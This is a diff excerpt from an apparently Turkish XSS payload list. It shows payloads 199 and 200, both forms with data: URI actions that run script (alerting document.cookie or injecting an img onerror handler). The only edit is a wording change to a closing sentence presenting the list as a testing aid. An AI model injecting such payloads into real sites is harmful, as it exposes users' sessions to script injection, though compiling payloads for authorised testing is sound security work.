@@ -240,4 +240,4 @@
 199. `<form action="data:text/html,<script>eval('alert(document.cookie)')</script>"><input type="submit" value="Submit"></form>`
 200. `<form action="data:text/html,<script>document.body.innerHTML = '<img src=x onerror=alert(2)>'</script>"><input type="submit" value="Submit"></form>`
 
-Bu liste ile XSS (Cross-Site Scripting) türlerini test edebilirsiniz. Her payload'un bir XSS açığını test etme potansiyeli vardır, bu nedenle uygulamanızda test ederken dikkatli olun ve güvenlik önlemleri alın.
+Bu liste ile XSS türlerini test edebilirsiniz. Her payload'un bir XSS açığını test etme potansiyeli vardır, bu nedenle uygulamanızda test ederken dikkatli olun ve güvenlik önlemleri alın.
